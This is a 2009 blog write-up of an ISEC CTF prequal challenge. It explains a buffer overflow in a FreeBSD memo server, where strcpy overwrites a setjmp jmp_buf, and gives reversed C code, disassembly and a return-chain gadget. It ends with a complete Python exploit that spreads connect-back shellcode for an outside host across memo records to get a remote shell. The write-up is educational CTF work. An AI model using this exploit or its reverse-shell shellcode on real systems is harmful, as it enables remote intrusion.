---
title: 'ISEC 2009 CTF Prequal &#8211; Challenge 12'
author: rd
excerpt: |
  |
    This is the write up for ISEC 2009 CTF Prequal challenge 12 as promised. Have fun.
layout: post

shorturls:
  - 'a:4:{s:9:"permalink";s:70:"https://www.vnsecurity.net/2009/08/isec-2009-ctf-prequal-challenge-12/";s:7:"tinyurl";s:26:"http://tinyurl.com/ydbz2uw";s:4:"isgd";s:18:"http://is.gd/aOtaj";s:5:"bitly";s:20:"http://bit.ly/74ZGyl";}'
tweetbackscheck:
  - 1408358995
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
category:
  - 'CTF - CLGT Crew'
---
## Summary

The provided [*isec*][1] binary is a memo server listening on port 8909. It has a remote buffer overflow bug in add memo function in which we can overwrite jmp_buf exception environment stored by setjmp(). Once *longjmp() *is called later in the program, we can control the EIP to execute our own code.

### Vulnerability

The bug is inside the function which is responsible for add memo command at **0x08048CE0**. Below is reverse C code of this function:

<pre class="brush: cpp; gutter: true; highlight: [0,29,37,38]; title: ; notranslate" title="">char memo_array[30][30];
char memoflag_array[30];
int lastmemo;
char buf4[4];

int add_memo(int fd)
{
    char buf128[128];
    int i;
    int idx;

    idx = lastmemo;
    memset(buf128, 0, 128);
    for ( i = 0; i &lt;= 14; ++i )
    {
        if ( i == 15 )
        {
            memcpy(buf128, "[!] Buffer Full!!n", 19);

            return send(fd, buf128, strlen(buf128), 0);
        }
        if ( !memoflag_array[i] )
        {
            idx = i;
            break;
        }
    }
    memoflag_array[idx] = 1;
    if ( !setjmp(exception_env) )
    {
        memcpy(buf128, "n[ Add Memo ]n", 15);
        send(fd, buf128, strlen(buf128), 0);
        memcpy(buf128, "Enter Message : ", 17);
        send(fd, buf128, strlen(buf128), 0);
        memset(buf128, 0, 128);
        recv(fd, buf128, 28, 0);
        strcpy(buf4, buf128);
        longjmp(exception_env, 1);
    }

    if ( strlen(buf128) &lt;= 18 )
    {
        memset(memo_array[idx], 0, 30);
        sprintf(memo_array[idx], "Memo : %s, size : %d", buf128, strlen(buf128));
        memcpy(buf128, "nSaved Memo!!nn", 16);
        send(fd, buf128, strlen(buf128), 0);
        result = lastmemo;
        if ( idx &gt;= lastmemo )
        {
             lastmemo = idx + 1;
             return lastmemo;
        }
    }
    else
    {
        memset(buf128, 0, 128u);
        memcpy(buf128, "size too big!!n", 16);
        send(fd, buf128, 128, 0);
    }
}
</pre>

It is easy to see a buffer overflow bug at line 37*** **strcpy(buf4, buf128)*. If the input is long enough (more than 24 bytes), we will be able to overwrite the *jmp\_buf exception\_env* (see below) which is being used to save exception stack by *setjmp()* at line 29. By overwriting the IP saved on this *jmp_buf* and pointing it back to our shellcode, once *longjmp()* is called later at line 38, our shellcode will be executed.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.bss:0804AD48 ; char buf[4]
.bss:0804AD48 buf4            db 4 dup(?)             ; DATA XREF: add_memo+312
.bss:0804AD4C                 public environ
.bss:0804AD4C environ         dd 5 dup(?)             ; DATA XREF: start+16
.bss:0804AD60 ; struct __jmp_buf_tag exception_env
.bss:0804AD60 exception_env   dd ?                    ; DATA XREF: add_memo+BD
.bss:0804AD60                                         ; 24 bytes away from buf4</pre>

### Exploit

It&#8217;s quite straight forward to exploit this bug. The only problem is that we need to find a good location to store our connect back shellcode as the server only get 28 bytes into buf128 from client. We could do this by splitting the shellcode into many small chunks across different memo records (each memo size is 30 bytes including some predefined texts so we have about 17 bytes for each shellcode chunk in each memo).

I was able to come up with a working exploit in about half an hour after started working on this challenge. Unfortunately, since there was no preparation for this CTF game, the only freesbsd shell I can get access to was a free shell on geekshell.org. It&#8217;s a 64 bits FreeBSD box (amd64), \`*gcc -m32*\` did not work and some weird behaviors happened due to 32-bit compatibility mode. It was kinda a pain. I spent couple of hours after finishing the exploit just to figure out why my exploit didn&#8217;t work, how weird behaviors happened, non-executable data/BSS and how to bypass it and so on.. instead of working on the challenge.

As the BSS segment was non-executable in this box, I searched around the binary and eventually found out a way to do multiple ret-into-code/libc chains (such as calling another recv() for the next stage) by pointing the EIP to 0&#215;08049454.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08049454                 add     esp, 24h
.text:08049457                 pop     ebx
.text:08049458                 pop     ebp
.text:08049459                 retn
</pre>

This code allows me to have ESP pointing back into the beginning part of controllable buf128 on stack for the ret/..ret/.. chaining.

Fortunately, while I was doing this, a friend went online and gave me the ssh access to his FreeBSD 32 bit box. So I stopped doing it and tried my previous exploit on this 32bits box. It worked without any problem after a few small tweaks.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">xxx@spark.ofloo.net&gt; nc -l 4445
id
uid=1006(memo) gid=1006(memo) groups=1006(memo)
cat key
WOWHACKER_WOWCODE&OVERHEAD!?
</pre>

### Exploit code

<pre class="brush: python; gutter: true; title: ; notranslate" title="">#!/usr/bin/env python

import socket

class memo:
	def  __init__(self, host, port):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((host, port))
		ret = self.s.recv(1024)
		print ret

	def addmemo(self, memo):
		cmd = "1n"
		self.s.send(cmd)
		ret = self.s.recv(1024)
		print ret
		ret = self.s.recv(1024)
		print ret
		print repr(memo) + "n"
		self.s.send(memo)
		ret = self.s.recv(1024)
		print ret
		ret = self.s.recv(1024)
		print ret

	def close(self):
		self.s.close()

host = "221.143.48.88"
port = 8909

c = memo(host, port)
a = raw_input("Enter to continue");

# metasploit connect back shellcode with few modifications (jmp)
# spark.ofloo.net:4445
sc = "x68xd4x47x13x66x68xffx02x11x5dx89xe7x31xc0x50x6ax01" 
     "x6ax02x6ax10xb0x61xcdx80x57x50x50x6ax62x58xcdx80x50" 
     "x6ax5ax58xcdx80xffx4fxe8x79xe6x68x2fx2fx73x68x68x2f" 
     "x62x69x6ex89xe3x50x54x53x50xb0x3bxcdx80"

SPLITS = [15, 28, 42, 56, 65]
JMPFWD = "xEBx0D"
prev = 0
for next in SPLITS:
	tmp = sc[prev:next]
	tmp = tmp.rjust(15,'x90') + JMPFWD
	c.addmemo(tmp)
	prev = next

# jmpbuf overflow [24 bytes] [EIP]
# 1st memo starts at memo_array+7 = 0x804a9c7
s = "A"*24 + "xc7xa9x04x08"
c.addmemo(s)

c.close()
</pre>

 [1]: /vnsec/Members/rd/Files/misc/isec.bin